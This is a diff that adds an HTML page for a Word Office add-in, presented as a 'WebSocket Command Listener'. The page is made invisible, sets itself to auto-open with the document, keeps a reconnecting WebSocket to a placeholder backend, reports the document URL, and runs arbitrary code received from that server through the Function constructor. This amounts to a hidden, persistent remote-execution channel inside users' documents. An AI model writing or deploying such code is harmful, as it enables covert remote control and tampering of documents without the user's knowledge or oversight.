@@ -1,0 +1,188 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>WebSocket Command Listener</title>
+    <script src="https://appsforoffice.microsoft.com/lib/1/hosted/office.js"></script>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            width: 0;
+            height: 0;
+            overflow: hidden;
+            position: absolute;
+            left: -9999px;
+        }
+        /* Completely invisible */
+        #container {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <div id="container"></div>
+    <script>
+        let ws = null;
+        let wordContext = null;
+
+        Office.onReady((info) => {
+            if (info.host === Office.HostType.Word) {
+                // Auto-enable auto-open so WebSocket stays connected
+                Office.context.document.settings.set('Office.AutoShowTaskpaneWithDocument', true);
+                Office.context.document.settings.saveAsync();
+
+                // Initialize WebSocket connection
+                connectWebSocket();
+            }
+        });
+
+        function connectWebSocket() {
+            // Replace with your WebSocket server URL
+            const wsUrl = 'wss://your-backend.com/ws';
+
+            try {
+                ws = new WebSocket(wsUrl);
+
+                ws.onopen = () => {
+                    console.log('✅ WebSocket connected');
+                    // Send authentication or document ID if needed
+                    ws.send(JSON.stringify({
+                        type: 'init',
+                        documentId: getDocumentId()
+                    }));
+                };
+
+                ws.onmessage = (event) => {
+                    console.log('📨 Received message:', event.data);
+                    handleCommand(event.data);
+                };
+
+                ws.onerror = (error) => {
+                    console.error('❌ WebSocket error:', error);
+                };
+
+                ws.onclose = () => {
+                    console.log('🔌 WebSocket disconnected. Reconnecting in 5s...');
+                    // Auto-reconnect after 5 seconds
+                    setTimeout(connectWebSocket, 5000);
+                };
+
+            } catch (error) {
+                console.error('Failed to connect WebSocket:', error);
+                // Retry connection after 5 seconds
+                setTimeout(connectWebSocket, 5000);
+            }
+        }
+
+        function handleCommand(data) {
+            try {
+                const command = JSON.parse(data);
+
+                switch (command.type) {
+                    case 'insertText':
+                        insertText(command.text, command.options);
+                        break;
+
+                    case 'executeWordAPI':
+                        executeWordAPI(command.code);
+                        break;
+
+                    case 'replaceText':
+                        replaceText(command.search, command.replace);
+                        break;
+
+                    default:
+                        console.warn('Unknown command type:', command.type);
+                }
+
+            } catch (error) {
+                console.error('Error parsing command:', error);
+            }
+        }
+
+        // Insert text at current cursor position
+        function insertText(text, options = {}) {
+            Office.context.document.setSelectedDataAsync(
+                text,
+                { coercionType: Office.CoercionType.Text },
+                (result) => {
+                    if (result.status === Office.AsyncResultStatus.Succeeded) {
+                        console.log('✅ Text inserted');
+                        sendResponse({ success: true, action: 'insertText' });
+                    } else {
+                        console.error('❌ Insert failed:', result.error);
+                        sendResponse({ success: false, error: result.error.message });
+                    }
+                }
+            );
+        }
+
+        // Execute arbitrary Word.js API code from backend
+        function executeWordAPI(code) {
+            try {
+                // Use Function constructor to execute code in controlled context
+                const executeCode = new Function('Word', 'Office', code);
+                executeCode(Word, Office);
+                sendResponse({ success: true, action: 'executeWordAPI' });
+            } catch (error) {
+                console.error('❌ Error executing Word API code:', error);
+                sendResponse({ success: false, error: error.message });
+            }
+        }
+
+        // Replace text in document
+        function replaceText(searchText, replaceWith) {
+            Word.run(async (context) => {
+                const searchResults = context.document.body.search(searchText);
+                searchResults.load('items');
+                await context.sync();
+
+                searchResults.items.forEach((item) => {
+                    item.insertText(replaceWith, Word.InsertLocation.replace);
+                });
+
+                await context.sync();
+                console.log(`✅ Replaced ${searchResults.items.length} instances`);
+                sendResponse({
+                    success: true,
+                    action: 'replaceText',
+                    count: searchResults.items.length
+                });
+
+            }).catch((error) => {
+                console.error('❌ Replace failed:', error);
+                sendResponse({ success: false, error: error.message });
+            });
+        }
+
+        // Send response back to server
+        function sendResponse(response) {
+            if (ws && ws.readyState === WebSocket.OPEN) {
+                ws.send(JSON.stringify(response));
+            }
+        }
+
+        // Get unique document identifier (if available)
+        function getDocumentId() {
+            // You can use Office.context.document.url or generate an ID
+            return Office.context.document.url || 'unknown-doc';
+        }
+
+        // Prevent task pane from closing on error
+        window.addEventListener('error', (event) => {
+            console.error('Global error:', event.error);
+            event.preventDefault();
+        });
+
+        // Keep connection alive with heartbeat
+        setInterval(() => {
+            if (ws && ws.readyState === WebSocket.OPEN) {
+                ws.send(JSON.stringify({ type: 'ping' }));
+            }
+        }, 30000); // Ping every 30 seconds
+
+    </script>
+</body>
+</html>
